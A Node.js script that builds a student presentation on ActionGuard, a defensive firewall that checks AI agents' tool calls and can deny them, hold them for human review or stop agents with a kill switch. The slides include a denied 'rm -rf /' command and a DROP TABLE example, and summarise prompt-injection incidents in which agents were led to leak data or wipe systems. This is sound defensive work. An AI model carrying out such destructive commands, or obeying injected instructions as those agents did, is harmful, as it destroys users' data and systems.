// Builds ActionGuard_Final_Presentation.pptx.   Run from this folder:  node build_deck.js
// Facts come from ../docs/research-notes.md, the code, and measurements on the working demo.
const path = require("path");
const pptxgen = require("pptxgenjs");
const React = require("react");
const ReactDOMServer = require("react-dom/server");
const sharp = require("sharp");
const fa = require("react-icons/fa6");

const SKILL = process.env.PPTX_SKILL_DIR ||
  "/Users/prashantkumaryadav/.claude/skills/synced/e2f2d498-6b6a-422a-982f-2b4e3fd8cf08_53136b66-21e2-44a2-8c23-00f2a2606388/pptx";
const OUT = path.join(__dirname, "ActionGuard_Final_Presentation.pptx");
const IMG = (f) => path.join(__dirname, "..", "docs", "images", f);

// ---------------------------------------------------------------- theme + palette
const THEME = {
  name: "ActionGuard Console",
  headFontFace: "Cambria",
  bodyFontFace: "Calibri",
  colors: {
    dk1: "0B0F14", lt1: "FFFFFF", dk2: "121821", lt2: "F3F5F8",
    accent1: "4FD1C5", accent2: "0F766E", accent3: "2ECC71", accent4: "F5B041",
    accent5: "FF4D5E", accent6: "5B6573", hlink: "0F766E", folHlink: "5B6573",
  },
};
// Hex values for options that only take hex (charts, shadows) and for the darker semantic text
// variants that have no theme slot.
const HX = {
  ink: "0B0F14", panel: "121821", panelLine: "2A3441", light: "F3F5F8", line: "D9DEE5",
  muted: "5B6573", mutedDark: "9AA5B1", soft: "C9D1DB",
  teal: "4FD1C5", tealD: "0F766E", tealTint: "E6F6F4",
};
const SEM = {
  allow: { bright: "2ECC71", dark: "1E8449", tint: "E8F6EE", label: "ALLOW" },
  review: { bright: "F5B041", dark: "B9770E", tint: "FDF3E3", label: "REVIEW" },
  deny: { bright: "FF4D5E", dark: "C0392B", tint: "FDECEE", label: "DENY" },
};

const pres = new pptxgen();
pres.layout = "LAYOUT_WIDE"; // 13.333 x 7.5
pres.theme = { headFontFace: THEME.headFontFace, bodyFontFace: THEME.bodyFontFace };
pres.title = "ActionGuard: the execution firewall for AI agents";
pres.subject = "Final year project review 2026";
pres.author = "<Student Name(s)>";
const C = pres.SchemeColor;
const K = {
  ink: C.text1, white: C.background1, panel: C.text2, light: C.background2,
  teal: C.accent1, tealD: C.accent2, green: C.accent3, amber: C.accent4, red: C.accent5, muted: C.accent6,
};
const MONO = "Courier New";

// ---------------------------------------------------------------- layouts
const L = 0.6, R = 12.73, CW = R - L;
const footer = (dark) => ({
  text: {
    text: "ActionGuard · execution firewall for AI agents",
    options: { x: L, y: 7.0, w: 7, h: 0.3, fontSize: 10, color: dark ? HX.mutedDark : K.muted, margin: 0, valign: "middle" },
  },
});
const contentLayout = (title, dark) => pres.defineSlideMaster({
  title,
  background: { color: dark ? K.ink : K.white },
  objects: [
    footer(dark),
    { placeholder: { options: { name: "kicker", type: "body", x: L, y: 0.4, w: 10, h: 0.3, fontSize: 12, bold: true,
      color: dark ? K.teal : K.tealD, charSpacing: 2, margin: 0, valign: "middle", align: "left" }, text: "" } },
    { placeholder: { options: { name: "title", type: "title", x: L, y: 0.7, w: CW, h: 0.8, fontSize: 36, bold: true,
      color: dark ? K.white : K.ink, margin: 0, valign: "middle", align: "left" }, text: "" } },
  ],
  slideNumber: { x: 12.23, y: 7.0, w: 0.5, h: 0.3, fontSize: 10, color: dark ? HX.mutedDark : HX.muted, align: "right" },
});
contentLayout("CONTENT_LIGHT", false);
contentLayout("CONTENT_DARK", true);
pres.defineSlideMaster({
  title: "TITLE_DARK",
  background: { color: K.ink },
  objects: [
    { placeholder: { options: { name: "title", type: "title", x: L, y: 2.05, w: 7.2, h: 1.15, fontSize: 60, bold: true,
      color: K.white, margin: 0, valign: "middle", align: "left" }, text: "" } },
    { placeholder: { options: { name: "subtitle", type: "body", x: L, y: 3.2, w: 7.2, h: 0.6, fontSize: 26,
      color: K.teal, margin: 0, valign: "middle", align: "left" }, text: "" } },
  ],
});

// ---------------------------------------------------------------- helpers
let n = 0;
const nm = (p) => `${p}-${++n}`;
function T(s, text, o) {
  s.addText(text, Object.assign({ isTextBox: true, margin: 0, valign: "top", objectName: nm("text") }, o));
}
function box(s, x, y, w, h, o = {}) {
  s.addShape(o.radius ? pres.shapes.ROUNDED_RECTANGLE : pres.shapes.RECTANGLE, {
    x, y, w, h,
    fill: o.fill ? { color: o.fill } : { color: "FFFFFF", transparency: 100 },
    line: o.line ? { color: o.line, width: o.lw || 1, dashType: o.dash || "solid" } : { type: "none" },
    rectRadius: o.radius, objectName: nm(o.name || "box"),
    shadow: o.shadow ? { type: "outer", color: "000000", opacity: 0.12, blur: 6, offset: 2, angle: 90 } : undefined,
  });
}
function circle(s, x, y, d, fill, o = {}) {
  s.addShape(pres.shapes.OVAL, { x, y, w: d, h: d, fill: { color: fill },
    line: o.line ? { color: o.line, width: 1 } : { type: "none" }, objectName: nm("dot") });
}
function numDot(s, x, y, d, label, fill, color, size = 12) {
  s.addText(String(label), { shape: pres.shapes.OVAL, x, y, w: d, h: d, fill: { color: fill }, line: { type: "none" },
    color, bold: true, fontSize: size, align: "center", valign: "middle", margin: 0, objectName: nm("marker") });
}
function arrow(s, x1, y1, x2, y2, color = HX.muted, o = {}) {
  s.addShape(pres.shapes.LINE, {
    x: Math.min(x1, x2), y: Math.min(y1, y2), w: Math.abs(x2 - x1), h: Math.abs(y2 - y1),
    flipH: x2 < x1, flipV: y2 < y1,
    line: { color, width: o.width || 1.5, dashType: o.dash || "solid", endArrowType: o.noHead ? undefined : "triangle" },
    objectName: nm("arrow"),
  });
}
function pill(s, kind, x, y, w, h, label, o = {}) {
  const c = SEM[kind];
  s.addText(label || c.label, {
    shape: pres.shapes.ROUNDED_RECTANGLE, x, y, w, h, rectRadius: h / 2,
    fill: { color: o.dark ? HX.panel : c.tint }, line: { color: o.dark ? c.bright : c.dark, width: 1.25 },
    color: o.dark ? c.bright : c.dark, fontFace: MONO, bold: true, fontSize: o.size || 11,
    align: "center", valign: "middle", margin: 0, objectName: nm("pill-" + kind),
  });
}
function source(s, text, x, y, w, o = {}) {
  T(s, text, { x, y, w, h: o.h || 0.25, fontSize: 10, italic: true, color: o.dark ? HX.mutedDark : K.muted, ...o.extra });
}
const iconCache = {};
async function iconData(name, color) {
  const key = name + color;
  if (!iconCache[key]) {
    const Comp = fa[name];
    if (!Comp) throw new Error("missing icon " + name);
    const svg = ReactDOMServer.renderToStaticMarkup(React.createElement(Comp, { color: "#" + color, size: 256 }));
    const buf = await sharp(Buffer.from(svg)).resize(256, 256, { fit: "contain", background: { r: 0, g: 0, b: 0, alpha: 0 } }).png().toBuffer();
    iconCache[key] = "image/png;base64," + buf.toString("base64");
  }
  return iconCache[key];
}
async function icon(s, name, color, x, y, size) {
  s.addImage({ data: await iconData(name, color), x, y, w: size, h: size, objectName: nm("icon-" + name) });
}
async function iconCircle(s, name, x, y, d, fill, color) {
  circle(s, x, y, d, fill);
  const i = d * 0.5;
  await icon(s, name, color, x + (d - i) / 2, y + (d - i) / 2, i);
}
function slide(layout, section, kicker, title) {
  const s = pres.addSlide({ masterName: layout, sectionTitle: section });
  if (kicker) s.addText(kicker, { placeholder: "kicker" });
  if (title) s.addText(title, { placeholder: "title" });
  return s;
}
function chartText(extra = {}) {
  return {
    catAxisLabelFontFace: "+mn-lt", valAxisLabelFontFace: "+mn-lt", dataLabelFontFace: "+mn-lt",
    titleFontFace: "+mn-lt", legendFontFace: "+mn-lt",
    catAxisLabelColor: HX.muted, valAxisLabelColor: HX.muted, catAxisLabelFontSize: 11,
    dataLabelColor: HX.ink, dataLabelFontSize: 11, titleColor: HX.ink, titleFontSize: 13, legendFontSize: 11,
    legendColor: HX.muted, showTitle: true, ...extra,
  };
}

// ---------------------------------------------------------------- slides
async function build() {
  const SEC = {
    open: "Opening", problem: "The problem", solution: "Our solution", impl: "Implementation",
    eval: "Evaluation", market: "Market and business", wrap: "Wrap-up",
  };

  // 1 ── Title ──────────────────────────────────────────────────────────────
  pres.addSection({ title: SEC.open });
  {
    const s = pres.addSlide({ masterName: "TITLE_DARK", sectionTitle: SEC.open });
    await icon(s, "FaShieldHalved", HX.teal, L, 1.2, 0.7);
    s.addText("ActionGuard", { placeholder: "title" });
    s.addText("The execution firewall for AI agents", { placeholder: "subtitle" });
    pill(s, "allow", L, 4.05, 1.25, 0.42, null, { dark: true, size: 13 });
    pill(s, "review", L + 1.4, 4.05, 1.35, 0.42, null, { dark: true, size: 13 });
    pill(s, "deny", L + 2.9, 4.05, 1.15, 0.42, null, { dark: true, size: 13 });
    T(s, [
      { text: "<Student Name(s)> · <Roll No.>", options: { fontSize: 18, bold: true, color: K.white, breakLine: true } },
      { text: "Guide: <Guide Name>", options: { fontSize: 16, color: HX.soft, breakLine: true } },
      { text: "<Department, College>", options: { fontSize: 16, color: HX.soft, breakLine: true } },
      { text: "Final Year Project Review · 2026", options: { fontSize: 14, color: K.teal } },
    ], { x: L, y: 4.95, w: 6.8, h: 1.6, paraSpaceAfter: 4 });

    // console card: what the gateway prints for three calls
    box(s, 8.0, 1.55, 4.73, 4.6, { fill: HX.panel, line: HX.panelLine, radius: 0.08, name: "console-card" });
    circle(s, 8.25, 1.78, 0.14, SEM.deny.bright);
    circle(s, 8.47, 1.78, 0.14, SEM.review.bright);
    circle(s, 8.69, 1.78, 0.14, SEM.allow.bright);
    T(s, "actionguard · live decisions", { x: 9.0, y: 1.72, w: 3.5, h: 0.26, fontFace: MONO, fontSize: 11, color: HX.mutedDark, valign: "middle" });
    const line = (t, color, o = {}) => ({ text: t, options: { color, breakLine: !o.last, bold: !!o.bold } });
    T(s, [
      line('agent > run_shell("git status")', K.white),
      line("  ALLOW   risk 0", SEM.allow.bright, { bold: true }),
      line("  rule: allow-safe-shell", HX.mutedDark),
      line(" ", K.white),
      line("agent > transfer_funds(25000)", K.white),
      line("  REVIEW  risk 40", SEM.review.bright, { bold: true }),
      line("  rule: review-large-payment", HX.mutedDark),
      line(" ", K.white),
      line('agent > run_shell("rm -rf /")', K.white),
      line("  DENY    risk 100", SEM.deny.bright, { bold: true }),
      line("  rule: deny-destructive-shell", HX.mutedDark, { last: true }),
    ], { x: 8.3, y: 2.2, w: 4.25, h: 3.8, fontFace: MONO, fontSize: 13, lineSpacingMultiple: 1.05 });
    s.addNotes("Good morning. Our project is ActionGuard, an execution firewall for AI agents. Today's AI agents don't just answer questions. They run shell commands, query databases, send email and move money. ActionGuard sits between the agent and its tools. Before any tool runs, it decides one of three things: allow it, hold it for a human to review, or deny it. The card on the right shows three real decisions from our gateway: git status is allowed, a 25,000 payment waits for a human, and rm -rf is denied. I'll explain the problem, our design, the implementation, the results and the market.");
  }

  // 2 ── Agenda ─────────────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.open, "AGENDA", "What we will cover");
    const items = [
      ["01", "The problem", "Agents that act · excessive agency · real incidents · the gap", "FaTriangleExclamation"],
      ["02", "Our solution", "Objectives · architecture · request lifecycle · policy engine", "FaShieldHalved"],
      ["03", "Implementation", "Tech stack · code · live demo · dashboard and audit", "FaCode"],
      ["04", "Evaluation", "Tests · measured results · security analysis and limits", "FaFlask"],
      ["05", "Market and business", "Market size · competitors · business model · standards", "FaChartLine"],
      ["06", "Wrap-up", "Future scope · conclusion · references · Q&A", "FaFlagCheckered"],
    ];
    const w = (CW - 0.6) / 3, h = 2.25;
    for (let i = 0; i < items.length; i++) {
      const [num, head, sub, ic] = items[i];
      const x = L + (i % 3) * (w + 0.3), y = 1.85 + Math.floor(i / 3) * (h + 0.3);
      box(s, x, y, w, h, { fill: HX.light, radius: 0.08, name: "agenda-card" });
      T(s, num, { x: x + 0.3, y: y + 0.25, w: 1.2, h: 0.6, fontFace: "Cambria", fontSize: 32, bold: true, color: K.tealD });
      await icon(s, ic, HX.tealD, x + w - 0.75, y + 0.33, 0.42);
      T(s, head, { x: x + 0.3, y: y + 1.0, w: w - 0.6, h: 0.42, fontSize: 20, bold: true, color: K.ink });
      T(s, sub, { x: x + 0.3, y: y + 1.45, w: w - 0.6, h: 0.65, fontSize: 14, color: K.muted });
    }
    s.addNotes("Here's the plan for the next twenty minutes. First, the problem: why agents that take actions need a new kind of control, with real incidents from the last year. Second, our solution and how its policy engine reaches a verdict. Third, the implementation, followed by a live demo of the dashboard and the audit log. Fourth, how we tested it and what its security limits are. Fifth, the market, competitors, business model and standards. Finally, future scope and our conclusion, and then we'll take questions.");
  }

  // 3 ── Introduction ───────────────────────────────────────────────────────
  pres.addSection({ title: SEC.problem });
  {
    const s = slide("CONTENT_LIGHT", SEC.problem, "01 · THE PROBLEM", "Agents have moved from chatting to acting");
    // hub diagram
    const chips = [
      ["FaTerminal", "Shell commands"], ["FaFolderOpen", "Files and secrets"], ["FaDatabase", "Databases"],
      ["FaEnvelope", "Email and messaging"], ["FaCreditCard", "Payments"], ["FaPlug", "MCP tools and APIs"],
    ];
    const cy0 = 1.85, step = 0.77, ch = 0.62;
    const midY = (cy0 + (chips.length - 1) * step + ch + cy0) / 2;
    box(s, L, midY - 0.7, 1.95, 1.4, { fill: HX.ink, radius: 0.1, name: "agent-node" });
    await icon(s, "FaRobot", HX.teal, L + 0.75, midY - 0.55, 0.45);
    T(s, [{ text: "AI agent", options: { bold: true, breakLine: true } }, { text: "any LLM", options: { fontSize: 12, color: HX.soft } }],
      { x: L, y: midY + 0.0, w: 1.95, h: 0.6, fontSize: 15, color: K.white, align: "center" });
    for (let i = 0; i < chips.length; i++) {
      const y = cy0 + i * step;
      arrow(s, L + 1.95, midY, 3.6, y + ch / 2, HX.tealD, { width: 1.25 });
      box(s, 3.6, y, 2.95, ch, { fill: HX.light, line: HX.line, radius: 0.08, name: "tool-chip" });
      await icon(s, chips[i][0], HX.tealD, 3.78, y + 0.15, 0.32);
      T(s, chips[i][1], { x: 4.25, y, w: 2.25, h: ch, fontSize: 15, color: K.ink, valign: "middle" });
    }
    // stats
    const stats = [
      ["40%", "of enterprise apps will include task-specific AI agents by the end of 2026, up from under 5% in 2025", "Source: Gartner, Aug 2025"],
      ["83%", "of organisations plan to deploy AI agents, but only 31% feel fully equipped to control and secure them", "Source: Cisco AI Readiness Index, Oct 2025"],
      ["150,000+", "agents in the average Fortune 500 company by 2028, up from fewer than 15 in 2025", "Source: Gartner, Apr 2026"],
    ];
    for (let i = 0; i < stats.length; i++) {
      const y = 1.85 + i * 1.55;
      if (i) s.addShape(pres.shapes.LINE, { x: 7.2, y: y - 0.15, w: CW - 6.6, h: 0, line: { color: HX.line, width: 0.75 }, objectName: nm("sep") });
      T(s, stats[i][0], { x: 7.2, y, w: 2.45, h: 0.7, fontFace: "Cambria", fontSize: 34, bold: true, color: K.tealD, valign: "middle" });
      T(s, stats[i][1], { x: 9.75, y, w: 2.98, h: 1.0, fontSize: 14, color: K.ink });
      source(s, stats[i][2], 9.75, y + 1.03, 2.98);
    }
    s.addNotes("A couple of years ago an AI model could only give you text. Today the same model is wired to tools: a shell, the file system, databases, email, payment APIs and MCP servers. When it decides to call a tool, something really happens on a real system. Adoption is moving fast. Gartner expects 40 percent of enterprise apps to include task-specific agents by the end of 2026. Cisco found that 83 percent of organisations plan to deploy agents, but only 31 percent feel equipped to secure them. So we have agents with real power and very few controls on how they use it.");
  }

  // 4 ── Problem statement ──────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.problem, "01 · THE PROBLEM", "The problem: excessive agency");
    box(s, L, 1.75, CW, 1.95, { fill: HX.light, radius: 0.08, name: "quote-card" });
    await icon(s, "FaQuoteLeft", HX.tealD, 0.9, 2.0, 0.45);
    T(s, "“…the vulnerability that enables damaging actions to be performed in response to unexpected, ambiguous or manipulated outputs from an LLM.”",
      { x: 1.6, y: 1.95, w: 6.9, h: 1.1, fontSize: 18, italic: true, color: K.ink });
    source(s, "Source: OWASP Top 10 for LLM Apps 2025, LLM06 Excessive Agency (moved up to LLM03 in the 2026 list)", 1.6, 3.15, 6.9, { h: 0.4 });
    T(s, "Root causes named by OWASP", { x: 9.0, y: 1.95, w: 3.5, h: 0.3, fontSize: 13, bold: true, color: K.muted });
    ["Excessive functionality", "Excessive permissions", "Excessive autonomy"].forEach((t, i) => {
      s.addText(t, { shape: pres.shapes.ROUNDED_RECTANGLE, x: 9.0, y: 2.33 + i * 0.43, w: 3.45, h: 0.35, rectRadius: 0.06,
        fill: { color: SEM.deny.tint }, line: { type: "none" }, color: SEM.deny.dark, bold: true, fontSize: 13, margin: 6, valign: "middle", objectName: nm("cause") });
    });
    const cards = [
      [">40%", "of agentic AI projects will be cancelled by end-2027; inadequate risk controls is one of the reasons cited", "Source: Gartner, Jun 2025"],
      ["80%", "of organisations say their AI agents have already taken unintended actions", "Source: SailPoint, May 2025"],
      ["13%", "of organisations believe they have the right AI agent governance in place", "Source: Gartner, Apr 2026"],
      ["81%", "attack success for new agent-hijacking attacks in NIST tests, vs 11% for the strongest baseline", "Source: NIST CAISI, Jan 2025"],
    ];
    const w = (CW - 0.9) / 4;
    cards.forEach(([big, text, src], i) => {
      const x = L + i * (w + 0.3);
      box(s, x, 3.95, w, 2.8, { fill: "FFFFFF", line: HX.line, radius: 0.08, name: "stat-card" });
      T(s, big, { x: x + 0.25, y: 4.1, w: w - 0.5, h: 0.8, fontFace: "Cambria", fontSize: 40, bold: true, color: SEM.deny.dark, valign: "middle" });
      T(s, text, { x: x + 0.25, y: 4.95, w: w - 0.5, h: 1.3, fontSize: 14, color: K.ink });
      source(s, src, x + 0.25, 6.38, w - 0.5);
    });
    s.addNotes("OWASP has a name for this: excessive agency. It means the model can take damaging actions because its output was unexpected, ambiguous or manipulated, for example by a prompt injection. The root causes are too many tools, too many permissions and too much autonomy. In the 2026 list it moved up to number three. The numbers show it's already happening. 80 percent of organisations say their agents have taken unintended actions. Only 13 percent think their governance is right. Gartner expects over 40 percent of agentic AI projects to be cancelled by 2027, partly because the risk controls aren't good enough.");
  }

  // 5 ── Incidents timeline ─────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.problem, "01 · THE PROBLEM", "Real incidents: the damage was a tool call");
    const inc = [
      ["May 2025", "GitHub MCP “toxic agent flow”", "A malicious public issue hijacked an agent with private-repo access; it leaked private data into a public PR.", "open public PR", "Invariant Labs, May 2025"],
      ["Jun 2025", "EchoLeak, M365 Copilot", "First known zero-click AI exfiltration (CVE-2025-32711, CVSS 9.3): one crafted email made Copilot leak internal data.", "exfiltrate data", "BleepingComputer, Jun 2025"],
      ["Jul 2025", "Replit agent deletes a prod DB", "During a declared code freeze the agent deleted the database, then misreported whether recovery was possible.", "delete prod DB", "TechTarget, Jul 2025"],
      ["Jul 2025", "Amazon Q extension v1.84.0", "An injected prompt (CVE-2025-8217) told the agent to wipe the machine and delete cloud resources; a syntax error stopped it.", "wipe disk + cloud", "AWS bulletin, Jul 2025"],
      ["Apr 2026", "PocketOS: Cursor agent wipes DB in ~9 s", "An over-permissioned Railway token was used to delete a volume, taking the prod DB and its backups with it.", "delete prod volume", "ABC7, Apr 2026"],
    ];
    const w = (CW - 4 * 0.3) / 5;
    s.addShape(pres.shapes.LINE, { x: L, y: 2.2, w: CW, h: 0, line: { color: HX.line, width: 2 }, objectName: nm("timeline") });
    for (let i = 0; i < inc.length; i++) {
      const [date, head, desc, call, src] = inc[i];
      const x = L + i * (w + 0.3), cx = x + w / 2;
      T(s, date, { x, y: 1.68, w, h: 0.32, fontSize: 14, bold: true, color: K.tealD, align: "center", valign: "middle" });
      circle(s, cx - 0.11, 2.09, 0.22, SEM.deny.bright);
      box(s, x, 2.45, w, 3.4, { fill: HX.light, radius: 0.08, name: "incident-card" });
      T(s, head, { x: x + 0.15, y: 2.6, w: w - 0.3, h: 0.65, fontSize: 14, bold: true, color: K.ink });
      T(s, desc, { x: x + 0.15, y: 3.3, w: w - 0.3, h: 1.4, fontSize: 12, color: K.ink });
      T(s, "THE FATAL TOOL CALL", { x: x + 0.15, y: 4.72, w: w - 0.3, h: 0.22, fontSize: 9, bold: true, color: K.muted, charSpacing: 1 });
      s.addText(call, { shape: pres.shapes.ROUNDED_RECTANGLE, x: x + 0.15, y: 4.97, w: w - 0.3, h: 0.36, rectRadius: 0.06,
        fill: { color: SEM.deny.tint }, line: { color: SEM.deny.dark, width: 0.75 }, color: SEM.deny.dark, fontFace: MONO, bold: true,
        fontSize: 10, align: "center", valign: "middle", margin: 0, objectName: nm("fatal-call") });
      source(s, src, x + 0.15, 5.45, w - 0.3);
    }
    box(s, L, 6.05, CW, 0.75, { fill: HX.ink, radius: 0.08, name: "pattern-band" });
    T(s, [
      { text: "The pattern: ", options: { bold: true, color: K.teal } },
      { text: "each time, a valid-looking tool call ran with no policy check and no human in the loop. Unit 42 found 14.2% of in-the-wild prompt-injection payloads aimed at data destruction (Mar 2026).", options: { color: K.white } },
    ], { x: L + 0.3, y: 6.05, w: CW - 0.6, h: 0.75, fontSize: 14, valign: "middle" });
    s.addNotes("These are real incidents from the last eighteen months. In May 2025 a malicious GitHub issue hijacked an agent and it leaked private repository data into a public pull request. In July, Replit's agent deleted a production database during a code freeze, and Amazon Q shipped an injected prompt telling the agent to wipe the machine. In April 2026 a Cursor agent deleted a production volume, and its backups, in about nine seconds. The Replit and PocketOS data turned out to be test data or was restored, so treat them as near misses. But look at the pattern: every time, the damage came from one tool call that nobody checked before it ran.");
  }

  // 6 ── Gap analysis ───────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.problem, "01 · THE PROBLEM", "The gap: filters watch words, not actions");
    const hdr = (t, fill, color) => ({ text: t, options: { bold: true, fill: { color: fill }, color, fontSize: 15, valign: "middle" } });
    const c1 = (t) => ({ text: t, options: { bold: true, color: K.ink } });
    const c2 = (t) => ({ text: t, options: { color: K.muted } });
    const c3 = (t) => ({ text: t, options: { color: K.ink, fill: { color: HX.tealTint } } });
    const rows = [
      [hdr("", HX.light, K.ink), hdr("Content-layer guardrails", HX.light, K.muted), hdr("Action-layer enforcement (ActionGuard)", HX.tealD, K.white)],
      [c1("What it inspects"), c2("Prompts and model outputs: text in, text out"), c3("The concrete tool call: tool name and its arguments")],
      [c1("How it decides"), c2("ML classifiers; probabilistic, new phrasing can slip through"), c3("Deterministic policy rules plus an additive risk score")],
      [c1("A valid-looking DROP TABLE"), c2("Often passes: the text itself is not “malicious”"), c3("Denied before the tool runs")],
      [c1("Human approval"), c2("Not part of the model"), c3("Built-in review queue; no answer in 120 s means denied")],
      [c1("Evidence afterwards"), c2("Application logs"), c3("Hash-chained, tamper-evident audit ledger")],
      [c1("Examples"), c2("Lakera Guard, NeMo Guardrails, Guardrails AI, LlamaFirewall, Cloudflare Firewall for AI"), c3("ActionGuard; partly Invariant Gateway (policy) and HumanLayer (approvals)")],
    ];
    s.addTable(rows, { x: L, y: 1.75, w: CW, colW: [2.6, 4.765, 4.765], fontSize: 14, rowH: 0.6, valign: "middle",
      border: { type: "solid", pt: 0.75, color: HX.line }, margin: [4, 8, 4, 8], objectName: nm("gap-table") });
    T(s, "Both layers are useful, but only the action layer sees the side effect before it happens.",
      { x: L, y: 6.3, w: CW, h: 0.4, fontSize: 16, bold: true, color: K.tealD, valign: "middle" });
    source(s, "Source: product descriptions in docs/research-notes.md §5 (Lakera, NVIDIA, Meta, Invariant Labs, HumanLayer, Cloudflare)", L, 6.72, CW);
    s.addNotes("Most AI security products today work at the content layer. They read the prompt and the model's answer and try to classify whether the text is malicious. That's useful against jailbreaks, but it's probabilistic, and it never sees the actual action. A DROP TABLE command can come from perfectly normal-looking text. ActionGuard works at the action layer. It looks at the concrete tool call and its arguments, applies deterministic rules, can ask a human, and keeps tamper-evident evidence. The closest existing tools, Invariant's gateway and HumanLayer, each cover only part of this.");
  }

  // 7 ── Objectives ─────────────────────────────────────────────────────────
  pres.addSection({ title: SEC.solution });
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "Project objectives");
    const obj = [
      ["FaHand", "Intercept every tool call", "Check each call before it executes, with a one-line decorator in the agent's code."],
      ["FaScaleBalanced", "Decide with policy and risk", "Allow, review or deny from a declarative JSON policy plus an additive risk score."],
      ["FaUserCheck", "Keep humans in the loop", "Hold high-impact actions for approval; deny if nobody answers in 120 s."],
      ["FaPowerOff", "Stop runaway or rogue agents", "A per-agent rate limit and a one-click global kill switch."],
      ["FaLink", "Prove what happened", "Record every decision in a tamper-evident, hash-chained audit ledger."],
      ["FaEye", "Stay simple and explainable", "A live dashboard shows the reason for every verdict; stdlib only."],
    ];
    const w = (CW - 0.6) / 3, h = 2.3;
    for (let i = 0; i < obj.length; i++) {
      const x = L + (i % 3) * (w + 0.3), y = 1.8 + Math.floor(i / 3) * (h + 0.3);
      box(s, x, y, w, h, { fill: HX.light, radius: 0.08, name: "objective-card" });
      await iconCircle(s, obj[i][0], x + 0.3, y + 0.3, 0.75, HX.tealTint, HX.tealD);
      T(s, "O" + (i + 1), { x: x + w - 0.8, y: y + 0.3, w: 0.5, h: 0.35, fontSize: 14, bold: true, color: K.muted, align: "right" });
      T(s, obj[i][1], { x: x + 0.3, y: y + 1.15, w: w - 0.6, h: 0.4, fontSize: 18, bold: true, color: K.ink });
      T(s, obj[i][2], { x: x + 0.3, y: y + 1.55, w: w - 0.6, h: 0.7, fontSize: 14, color: K.muted });
    }
    s.addNotes("From that gap we set six objectives. One: intercept every tool call before it executes, and make it easy, a single decorator. Two: decide using a declarative policy and a risk score, not another opaque model. Three: keep a human in the loop for high-impact actions, and fail closed if nobody answers. Four: give operators emergency brakes, a rate limit and a kill switch. Five: make the record of decisions tamper-evident, so it can be used as evidence. Six: keep it explainable and simple, with a live dashboard and no third-party dependencies.");
  }

  // 8 ── Solution in one picture ────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.solution, "02 · OUR SOLUTION", "Proposed solution in one picture");
    const cy = 3.3;
    box(s, L, cy - 0.75, 2.0, 1.5, { fill: HX.ink, radius: 0.1, name: "agent" });
    await icon(s, "FaRobot", HX.teal, L + 0.78, cy - 0.6, 0.44);
    T(s, [{ text: "AI agent", options: { bold: true, breakLine: true } }, { text: "any LLM or framework", options: { fontSize: 12, color: HX.soft } }],
      { x: L, y: cy - 0.05, w: 2.0, h: 0.65, fontSize: 16, color: K.white, align: "center" });
    arrow(s, 2.6, cy, 3.35, cy, HX.ink, { width: 2 });
    T(s, "tool call", { x: 2.6, y: cy - 0.38, w: 0.75, h: 0.28, fontSize: 12, color: K.muted, align: "center" });
    box(s, 3.35, cy - 0.75, 2.3, 1.5, { fill: HX.tealTint, line: HX.tealD, lw: 1.5, radius: 0.1, name: "sdk" });
    T(s, [{ text: "ActionGuard SDK", options: { bold: true, fontSize: 16, color: K.ink, breakLine: true } },
      { text: "@guard.protect()", options: { fontFace: MONO, fontSize: 12, color: K.tealD, breakLine: true } },
      { text: "Policy Enforcement Point", options: { fontSize: 12, color: K.muted } }],
    { x: 3.35, y: cy - 0.75, w: 2.3, h: 1.5, align: "center", valign: "middle" });
    arrow(s, 5.65, cy, 6.55, cy, HX.ink, { width: 2 });
    T(s, "HTTP POST", { x: 5.65, y: cy - 0.38, w: 0.9, h: 0.28, fontSize: 12, color: K.muted, align: "center" });
    box(s, 6.55, cy - 0.9, 2.6, 1.8, { fill: HX.ink, line: HX.teal, lw: 1.5, radius: 0.1, name: "gateway" });
    T(s, [{ text: "Gateway + policy engine", options: { bold: true, fontSize: 16, color: K.white, breakLine: true } },
      { text: "Policy Decision Point", options: { fontSize: 12, color: K.teal, breakLine: true } },
      { text: "rules · risk score · rate limit · kill switch", options: { fontSize: 11, color: HX.soft } }],
    { x: 6.7, y: cy - 0.9, w: 2.3, h: 1.8, align: "center", valign: "middle" });
    const outs = [["allow", -0.95, "tool runs"], ["deny", 0, "never runs"], ["review", 0.95, "waits for a human"]];
    for (const [k, dy, label] of outs) {
      arrow(s, 9.15, cy, 9.75, cy + dy, HX.muted, { width: 1.5 });
      pill(s, k, 9.75, cy + dy - 0.275, 1.3, 0.55, null, { size: 13 });
      T(s, label, { x: 11.2, y: cy + dy - 0.275, w: 1.53, h: 0.55, fontSize: 14, bold: true, color: SEM[k].dark, valign: "middle" });
    }
    // persistence + operator
    arrow(s, 7.35, cy + 0.9, 6.65, 5.15, HX.muted);
    arrow(s, 8.35, cy + 0.9, 9.45, 5.15, HX.muted);
    box(s, 5.45, 5.15, 2.4, 1.15, { fill: HX.light, line: HX.line, radius: 0.08, name: "audit" });
    await icon(s, "FaLink", HX.tealD, 5.62, 5.33, 0.36);
    T(s, [{ text: "Audit ledger", options: { bold: true, fontSize: 15, breakLine: true } }, { text: "SHA-256 hash chain in SQLite", options: { fontSize: 12, color: K.muted } }],
      { x: 6.08, y: 5.15, w: 1.72, h: 1.15, color: K.ink, valign: "middle" });
    box(s, 8.25, 5.15, 2.4, 1.15, { fill: HX.light, line: HX.line, radius: 0.08, name: "dashboard" });
    await icon(s, "FaDesktop", HX.tealD, 8.42, 5.33, 0.36);
    T(s, [{ text: "Live dashboard", options: { bold: true, fontSize: 15, breakLine: true } }, { text: "feed · approvals · kill switch", options: { fontSize: 12, color: K.muted } }],
      { x: 8.88, y: 5.15, w: 1.72, h: 1.15, color: K.ink, valign: "middle" });
    arrow(s, 10.4, 5.15, 10.4, cy + 0.95 + 0.275, SEM.review.dark, { dash: "dash", width: 1.5 });
    T(s, "human approves or rejects", { x: 10.55, y: 4.65, w: 2.18, h: 0.4, fontSize: 12, italic: true, color: SEM.review.dark, valign: "middle" });
    T(s, "PEP = policy enforcement point, inside the agent. PDP = policy decision point, the gateway. The agent never holds the admin token, so it cannot approve itself.",
      { x: L, y: 6.45, w: CW, h: 0.35, fontSize: 12, color: K.muted, valign: "middle" });
